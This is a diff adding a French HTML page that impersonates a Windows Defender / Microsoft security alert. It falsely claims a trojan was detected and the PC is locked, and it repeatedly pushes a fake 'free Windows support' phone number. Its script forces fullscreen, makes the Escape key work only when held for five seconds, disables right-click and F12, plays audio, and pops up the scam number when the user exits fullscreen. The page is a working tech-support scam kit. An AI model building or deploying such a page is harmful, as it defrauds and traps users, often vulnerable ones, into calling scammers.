@@ -1,0 +1,704 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Notification de Sécurité</title>
+    <link rel="shortcut icon" href="./logo.jpg" type="image/x-icon">
+    <link rel="jquery" href="./jquery.js">
+    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
+
+
+    <style>
+        
+ @keyframes moveVertical {
+    0% {
+        transform: translateY(200%);
+    }
+    100% {
+        transform: translateY(-79%);
+    }
+}
+
+.alert-container {
+    display: none;
+    position: fixed;
+    padding: 20px;
+    background-color: #f5efef;
+    color: rgb(228, 41, 41);
+    border-radius: 12px;
+    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+    text-align: center;
+    animation: bounce  2s ease-in-out infinite;  /* Bumping animation */
+    bottom: 10%;
+    right: 75%;  /* Center horizontally */
+    transform: translateX(-50%);
+}
+
+@keyframes bounce {
+    0% {
+        transform: translateY(0);
+    }
+    25% {
+        transform: translateY(-10px); /* Move up */
+    }
+    50% {
+        transform: translateY(0); /* Back to original */
+    }
+    75% {
+        transform: translateY(-5px); /* Small bounce */
+    }
+    100% {
+        transform: translateY(0);
+    }
+}
+
+   
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+    @keyframes moveAround {
+    0% {
+        bottom: 0;
+        right: 0;
+    }
+    50% {
+        bottom: 50%;
+        right: 50%;
+        transform: translate(50%, 50%);
+    }
+    100% {
+        bottom: 10%;
+        right: 10%;
+        transform: translate(0, 0);
+    }
+}
+.right-container {
+            width: 25%;
+            background-color: #636060;
+            padding: 20px;
+            box-shadow: -2px 0 8px rgba(0, 0, 0, 0.1);
+            border-left: 1px solid #ccc;
+            height: 100vh;
+            border-radius: 20px;
+
+            
+        }
+
+        .moving-text {
+            display: inline-block;
+            animation: moveLeftRight 5s ease-in-out infinite;
+            font-weight: bold;
+            color: #ffffff;
+        }
+
+        :root {
+            --primary-color: #000000;
+            --secondary-color: #0275d8;
+            --background-color: #ffffff;
+            --text-color: #c70909;
+            --font-family: Arial, sans-serif;
+        }
+
+        body {
+            font-family: var(--font-family);
+            background-image: url('./Bg2.png');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            flex-direction: column;
+            overflow: hidden;
+            background-attachment: fixed; /* Ensure background stays fixed and covers fullscreen */
+            width: 100vw; /* Ensure background covers full width */
+            min-height: 100vh; /* Ensure background covers full height */
+
+            cursor:none; /* Hide the default cursor */
+        }
+
+        /* Custom Cursor Style */
+        .custom-cursor {
+            position: absolute;
+            width: 30px;
+            height: 30px;
+            background-color: rgba(228, 224, 224, 0.034);
+            border-radius: 50%;
+            pointer-events: none;
+            transition: transform 0.7s ease-out; /* Slower transition with lag effect */
+            transform: translate(-50%, -50%);
+            display: block; /* Show your custom cursor */
+        }
+
+        .notification {
+            background-color: rgb(255, 255, 255);
+            padding: 10px;
+            border-radius: 20px;
+            box-shadow: 0 20px 20px rgba(0, 0, 0, 0.622);
+            max-width: 1000px;
+            text-align: center;
+            margin-top: auto;
+            margin-bottom: 10px;
+        }
+
+        .security-icon {
+            width: 50px;
+            height: auto;
+            margin-right: 10px;
+        }
+
+        .close-icon {
+            width: 24px;
+            height: auto;
+            margin-left: 150px;
+        }
+
+        .help-icon {
+            width: 250px;
+            height: auto;
+            display: block;
+            margin: 0 auto;
+        }
+
+        .logo-icon {
+            width: 100px;
+            height: auto;
+            margin-right: 200px;
+        }
+
+        .logoM-icon {
+            width: 25px;
+            height: auto;
+        }
+        .notification[role='alert'], .notification[role='secondAlert'] {
+    display: none;
+}
+
+.notification.active {
+    display: block;
+}
+        .notification h2 {
+            margin-top: 0;
+            color: var(--primary-color);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .notification p {
+            margin: 10px 0;
+            color: var(--text-color);
+        }
+
+        .notification a {
+            color: var(--secondary-color);
+            text-decoration: none;
+        }
+
+        .notification a:hover {
+            text-decoration: underline;
+        }
+
+        .button-container {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 20px;
+        }
+  
+
+        .button {
+            padding: 10px 20px;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        .deny-button {
+            background-color: #ffffff;
+            color: #333;
+            border: 1px solid #ccc;
+        }
+
+        .allow-button {
+            background-color: #0275d8;
+            color: #ffffff;
+        }
+
+        .separator {
+            width: 80%;
+            margin: 20px auto;
+            border-top: 1px solid #ccc;
+        }
+
+        .popup {
+            background-color: #010101a8;
+            padding: 10px;
+            box-shadow: 0 20px 20px rgba(0, 0, 0, 0.622);
+            max-width: 800px;
+            text-align: center;
+            margin-top: 10px;
+            margin-bottom: 10px;
+        }
+
+        .popup-content {
+            text-align: center;
+        }
+
+        .popup-content p {
+            margin-bottom: 10px;
+        }
+
+        .footer {
+            background-color: #0275d8;
+            color: #ffffff;
+            padding: 10px;
+            text-align: center;
+            margin-top: auto;
+            border-radius: 8px;
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .footer span {
+            margin: 5px 0;
+        }
+
+        .footer p {
+            margin: 5px 0;
+        }
+
+        .footer a {
+            color: #ffffff;
+            font-weight: bold;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        @media (max-width: 600px) {
+            .notification {
+                width: 90%;
+                padding: 15px;
+            }
+
+            .footer {
+                flex-direction: column;
+                text-align: center;
+            }
+        }
+        
+        
+        .modal {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.2);
+            max-width: 400px;
+            margin: auto;
+            height: 250px;
+            left: 65%;
+            top: 20%;
+        }
+        .buttons {
+            margin-top: 15px;
+        }
+        .button {
+            padding: 10px 20px;
+            font-size: 16px;
+            border: none;
+            cursor: pointer;
+            border-radius: 5px;
+        }
+        .ok {
+            background-color: #0078D4;
+            color: white;
+        }
+        .cta {
+            background-color: #28a745;
+            color: white;
+            margin-left: 10px;
+        }
+    
+    
+    </style>
+</head>
+<body>
+    /
+    
+    <!-- Audio files -->
+    <audio id="bg-music-2" loop>
+        <source src="./homme.mp3" type="audio/mpeg">
+    </audio>
+    <div id="virus-alert" class="alert-container">
+        <div class="triangle"></div>
+        <strong style="font-size: 20px;">⚠ VIRUS DÉTECTÉ ⚠</strong>
+        <p style="color: #000000;"> Veuillez appelez l'assistance Windows gratuit</p>
+        <p style="display: inline-block; padding: 10px 20px; background-color: #f1efef; color: #275ed6; font-weight: bold; border: 1px solid rgb(141, 139, 139); border-radius: 5px; text-decoration: none;"><span style="font-weight: bolder;">9-73-41-02-50</span> </p>
+      </div>
+    <div class="popup" id="action-popup" >
+        <div class="popup-content">
+            <p style="font-weight: bold; color: #ffffff;">Ne pas redémarrer ni utiliser ton ordinateur.</p>
+            <p style="font-weight: bold; color: #ffffff;">Votre ordinateur est désactivé. Veuillez appeler Microsoft</p>
+            <p style="font-weight: bold; color: #ffffff;">L'accès est la raison de la sécurité du bloc pour cela l'ordinateur.</p>
+            <p style="font-weight: bold; color: #ffffff;">Veuillez appelez l'assistance Windows gratuit<a  style="font-weight: bold; color: #11a52f;">  9-73-41-02-50</a>  </p>            <p id="popup-message" style="font-weight: bold; color: #ffffff;"></p>
+        </div>
+    </div>
+    
+
+    <div class="notification" role="alert">
+        <h2>
+            <img class="security-icon" src="./icons8-windows-defender-50.png" alt="Icône de sécurité">
+            Centre de sécurité Windows Defender
+            <img class="close-icon" src="./icons8-x-24.png" alt="Close icon">
+        </h2>
+        <div class="separator"></div>
+
+        <p style="font-weight: bold;">Application: Ads/Lancetrack(2).dll</p>
+        <p style="font-weight: bold;">Menace détectée : Logiciel espion cheval de Troie</p>
+
+        <img class="help-icon" src="./assitant.jpg" alt="Help icon">
+        <p style="font-weight: bold; color: #000000;">L'accès à ce PC a été bloqué pour des raisons de sécurité.</p>
+        <p style="font-weight: bold; color: #0275d8;">Contactez l'assistance Windows : <a href="tel:#" style="font-weight: bold; color: #11a52f;">9-73-41-02-50</a> (Assistance</p>
+        <p style="font-weight: bold; color: #0275d8;">téléphonique de sécurité)</p>
+
+        <div class="separator"></div>
+
+        <div class="button-container">
+            <img class="logo-icon" src="./logo_wit_ name.jpg" alt="logo icon">
+            <button class="button deny-button">Refuser</button>
+            <button class="button allow-button">Permettre</button>
+        </div>
+    </div>
+ 
+    <div class="notification" role="secondAlert">
+        <h2>
+            <img class="security-icon" src="./icons8-windows-defender-50.png" alt="Icône de sécurité">
+            Centre de sécurité Windows Defender
+            <img class="close-icon" src="./icons8-x-24.png" alt="Close icon">
+        </h2>
+        <div class="separator"></div>
+
+        <p style="font-weight: bold;">Adresse IP: 2.11.163.199 </p>
+        <p style="font-weight: bold;">Lieu: Europ , France</p>
+        <p style="font-weight: bold;">FAI: Operation S.A</p>
+
+
+        <img class="help-icon" src="./windows.jpg" alt="Help icon">
+        <p style="font-weight: bold; color: #000000;">L'accès à ce PC a été bloqué pour des raisons de sécurité.</p>
+        <p style="font-weight: bold; color: #0275d8;">Appelez l'assistance Windows  <a href="tel:#" style="font-weight: bold; color: #11a52f;">9-73-41-02-50</a> </p>
+
+        <div class="separator"></div>
+
+        <div class="button-container">
+            <img class="logo-icon" src="./logo_wit_ name.jpg" alt="logo icon">
+            <button class="button deny-button">Refuser</button>
+            <button class="button allow-button">Permettre</button>
+        </div>
+        
+    </div>
+    
+    <div class="footer">
+        <span><img class="logoM-icon" src="./logo.jpg" alt="Icône de micro">Microsoft: Contactez le support  <a href="tel:#" style="display: inline-block; padding: 10px 20px; background-color: white; color: #11a52f; font-weight: bold; border: 2px solid white; border-radius: 5px; text-decoration: none;">
+            9-73-41-02-50
+          </a>
+          
+           (Appel gratuit)</span>
+        <p class="moving-text">Dossiers, identité en ligne, informations financières, fichiers personnels, photos ou documents.</p>
+    </div>
+    <div class="body">
+        <div class="modal" id="exitPrompt">
+            <h2>Microsoft: Contactez le support</h2>
+            <p style="font-weight: 900; font-size: 20px; color: #0078D4; font-size: 25px;">9-73-41-02-50 <br> (sans frais) </p>
+            <div class="buttons">
+                <button class="button ok" onclick="openFullscreen()">OK</button>
+                <a class="button cta" onclick="openFullscreen()">France: gratuit</a>
+            </div>
+        </div>
+    </div>
+    <audio id="exitSound" src="mixkit-software-interface-start-2574.wav"></audio>
+<!-- Include jQuery.js -->
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+
+<!-- Include Bootstrap.js -->
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.bundle.min.js"></script>
+
+<!-- Include Push.js -->
+<script src="https://cdn.push.js/bin/push.min.js"></script>
+
+<!-- Include Fullscreen.js -->
+<script src="path/to/fullscreen.js"></script>
+
+<!-- Include BEFOR.js -->
+<script src="path/to/befor.js"></script>
+
+<!-- Include Init.js -->
+<script src="path/to/init.js"></script>
+
+    <script>
+      document.addEventListener("DOMContentLoaded", function () {
+    const music1 = document.getElementById("bg-music-1");
+    const music2 = document.getElementById("bg-music-2");
+
+    async function playAudio() {
+        try {
+            await music2.play();
+            console.log("Autoplay successful!");
+        } catch (error) {
+            console.log("Autoplay blocked. Waiting for user interaction.");
+            document.addEventListener("click", enableAudio, { once: true });
+        }
+    }
+
+    function enableAudio() {
+        music1.play().catch(err => console.log("Error playing music1:", err));
+        music2.play().catch(err => console.log("Error playing music2:", err));
+    }
+
+    playAudio();
+
+    // Custom Cursor Movement with Lag Effect
+    const cursor = document.createElement('div');
+    cursor.classList.add('custom-cursor');
+    document.body.appendChild(cursor);
+
+    let cursorX = 0, cursorY = 0;
+    let targetX = 0, targetY = 0;
+    const cursorSpeed = 0.1; // Higher value = slower lag effect
+
+    document.addEventListener('mousemove', (e) => {
+        targetX = e.pageX;
+        targetY = e.pageY;
+    });
+
+    function updateCursor() {
+        cursorX += (targetX - cursorX) * cursorSpeed;
+        cursorY += (targetY - cursorY) * cursorSpeed;
+
+        cursor.style.left = `${cursorX}px`;
+        cursor.style.top = `${cursorY}px`;
+
+        requestAnimationFrame(updateCursor);
+    }
+
+    updateCursor();
+
+    // Fullscreen logic
+    document.addEventListener("click", () => {
+        if (document.documentElement.requestFullscreen) {
+            document.documentElement.requestFullscreen();
+        } else if (document.documentElement.mozRequestFullScreen) { // Firefox
+            document.documentElement.mozRequestFullScreen();
+        } else if (document.documentElement.webkitRequestFullscreen) { // Chrome, Safari, Opera
+            document.documentElement.webkitRequestFullscreen();
+        } else if (document.documentElement.msRequestFullscreen) { // IE/Edge
+            document.documentElement.msRequestFullscreen();
+        }
+    });
+
+    // Popup show logic when buttons are clicked
+    const refuserButton = document.querySelector('.deny-button');
+    const permettreButton = document.querySelector('.allow-button');
+    const popup = document.getElementById("action-popup");
+    const popupMessage = document.getElementById("popup-message");
+    const closePopupButton = document.getElementById("close-popup");
+
+    refuserButton.addEventListener('click', () => {
+        popup.style.display = 'block';
+    });
+
+    permettreButton.addEventListener('click', () => {
+        popup.style.display = 'block';
+    });
+    document.addEventListener('click', showAlert);
+
+function showAlert() {
+    const alertBox = document.getElementById('virus-alert');
+    if (alertBox.style.display === 'none' || alertBox.style.display === '') {
+        alertBox.style.display = 'block';
+    }
+}
+
+function hideAlert() {
+    document.getElementById('virus-alert').style.display = 'none';
+}
+    
+});
+document.addEventListener("DOMContentLoaded", function () {
+        const notifications = document.querySelectorAll(".notification");
+        let currentIndex = 0;
+
+        const buttons = document.querySelectorAll(".notification .button");
+        buttons.forEach(button => {
+            button.addEventListener('click', () => {
+                notifications[currentIndex].classList.remove('active');
+                currentIndex = (currentIndex + 1) % notifications.length;
+                notifications[currentIndex].classList.add('active');
+            });
+        });
+
+        notifications[currentIndex].classList.add('active');
+    });
+     // Prevent right-click context menu
+  document.addEventListener('contextmenu', function(e) {
+    e.preventDefault();
+  });
+  // Prevent the user from closing the browser window
+window.addEventListener("beforeunload", function (event) {
+    const message = "Are you sure you want to leave? Your changes may not be saved.";
+    event.returnValue = message; // Standard way to trigger the confirmation dialog
+    return message; // Some browsers require returning a message for the dialog to appear
+});
+//////////////////////////////////////////////////////////////
+$(document).ready(function() {
+        // Video element
+        var bgVideo = document.getElementById("bg-video");
+        var exitMessage = document.getElementById("exitMessage");
+
+        var isFullscreen = false;
+        var isHoldingEscape = false;
+        var escapeTimer;
+
+        // Function to enter fullscreen
+        function enterFullscreen() {
+            var el = document.documentElement;
+            if (el.requestFullscreen) {
+                el.requestFullscreen();
+            } else if (el.webkitRequestFullscreen) {
+                el.webkitRequestFullscreen();
+            } else if (el.mozRequestFullScreen) {
+                el.mozRequestFullScreen();
+            } else if (el.msRequestFullscreen) {
+                el.msRequestFullscreen();
+            }
+            isFullscreen = true;
+            exitMessage.classList.remove("hidden");
+        }
+
+        // Function to exit fullscreen
+        function exitFullscreen() {
+            if (document.exitFullscreen) {
+                document.exitFullscreen();
+            } else if (document.webkitExitFullscreen) {
+                document.webkitExitFullscreen();
+            } else if (document.mozCancelFullScreen) {
+                document.mozCancelFullScreen();
+            } else if (document.msExitFullscreen) {
+                document.msExitFullscreen();
+            }
+            isFullscreen = false;
+            bgVideo.pause(); // Pause the video when exiting fullscreen
+            exitMessage.classList.add("hidden");
+        }
+
+        // Block Escape key to exit fullscreen unless holding for 5 seconds
+        $(window).on("keydown", function (e) {
+            if (e.key === "Escape" && !isHoldingEscape) {
+                e.preventDefault();
+                isHoldingEscape = true;
+                escapeTimer = setTimeout(exitFullscreen, 5000); // Wait 5 seconds before exiting fullscreen
+            }
+        });
+
+        $(window).on("keyup", function (e) {
+            if (e.key === "Escape") {
+                clearTimeout(escapeTimer);
+                isHoldingEscape = false;
+            }
+        });
+
+        // Block right-click and developer tools access
+        $(window).on("contextmenu", function (e) {
+            e.preventDefault();
+        });
+
+        // Block F12 key for developer tools
+        $(window).on("keydown", function (e) {
+            if (e.keyCode === 123) {
+                e.preventDefault();
+            }
+        });
+
+        // Force fullscreen on user click
+        $(window).on("click", function () {
+            if (!isFullscreen) {
+                enterFullscreen();
+            }
+        });
+
+        // Scroll to trigger fullscreen if not triggered yet
+        $(window).on("scroll", function () {
+            if (!isFullscreen && $(window).scrollTop() > 50) {
+                enterFullscreen();
+            }
+        });
+
+        // Ensure fullscreen is not triggered on page load (requires user interaction)
+        $(window).on("load", function () {
+            // Fullscreen will be triggered after the user interacts
+        });
+
+        // Show Push notification when entering fullscreen
+        Push.create("Entering Fullscreen", {
+            body: "Click anywhere on the screen to enter fullscreen.",
+            timeout: 4000,
+            onClick: function () {
+                window.focus();
+                this.close();
+            }
+        });
+
+        // Example using BEFOR.js
+        $(document).on("beforeunload", function() {
+            return "Are you sure you want to leave?";
+        });
+
+        // Initialize or configure anything else using Init.js
+        $(document).ready(function() {
+            // Initialization code for Init.js
+        });
+
+    });
+    const elem = document.documentElement;
+    
+        function openFullscreen() {
+          if (elem.requestFullscreen) {
+            elem.requestFullscreen();
+          } else if (elem.webkitRequestFullscreen) { /* Safari */
+            elem.webkitRequestFullscreen();
+          } else if (elem.msRequestFullscreen) { /* IE11 */
+            elem.msRequestFullscreen();
+          } else if (elem.mozRequestFullScreen) { /* Firefox */
+            elem.mozRequestFullScreen();
+          }
+        }
+    
+        document.addEventListener('fullscreenchange', handleFullscreenChange);
+        document.addEventListener('webkitfullscreenchange', handleFullscreenChange);
+        document.addEventListener('mozfullscreenchange', handleFullscreenChange);
+        document.addEventListener('MSFullscreenChange', handleFullscreenChange);
+    
+        function handleFullscreenChange() {
+          if (!document.fullscreenElement && !document.webkitFullscreenElement && !document.mozFullScreenElement && !document.msFullscreenElement) {
+            document.getElementById('exitPrompt').style.display = 'block';
+            document.getElementById('exitSound').play();
+          } else {
+            document.getElementById('exitPrompt').style.display = 'none';
+          }
+        }
+        
+    </script>
+   
+</body>
+</html>
